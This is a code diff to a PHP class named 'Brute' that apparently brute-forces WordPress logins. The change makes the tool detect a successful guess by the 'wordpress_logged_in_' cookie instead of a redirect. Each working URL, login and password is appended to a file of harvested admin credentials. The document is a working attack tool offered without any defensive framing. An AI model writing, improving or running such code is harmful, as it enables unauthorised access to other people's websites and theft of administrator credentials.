@@ -15,17 +15,19 @@ class Brute
     {
         $this->client = (new HttpClientBuilder())
             ->retry(3)
-            ->followRedirects(0)
+            ->followRedirects(2)
             ->build();
     }
 
     public function __invoke($data)
     {
         $url = explode(';', $data['url'])[0];
-        $admin_redirect_url = str_replace('wp-login.php', '', $url) . 'wp-admin/';
+        $wp_cookie_login = 'wordpress_logged_in_';
+
         $login = $this->loginCheck($data);
         $password = $this->passwordCheck($data, $login);
         $iteration = $this->checkIterator($data, $login, $password);
+        $authorized = false;
 
         if ($iteration == true) {
             $log = new Logger('name');
@@ -39,10 +41,21 @@ class Brute
             $request->setBody($body);
 
             $response = yield $this->client->request($request);
-            $originalResponse = $response->getOriginalResponse();
+            $cookies = $response->getHeaders()['set-cookie'];
 
+            foreach ($cookies as $cookie) {
+                if (str_contains($cookie, $wp_cookie_login))
+                    $authorized = true;
+            }
 
-            if ($originalResponse->getStatus() === 302 && $originalResponse->getHeader('location') == $admin_redirect_url) {
+//            var_dump([
+//                $login,
+//                $password,
+//                'куки' => $cookies,
+//                'авторизация' => $authorized
+//            ]);die;
+
+            if ($authorized == true) {
                 $wp_admin = "{$url};{$login};{$password}";
                 file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
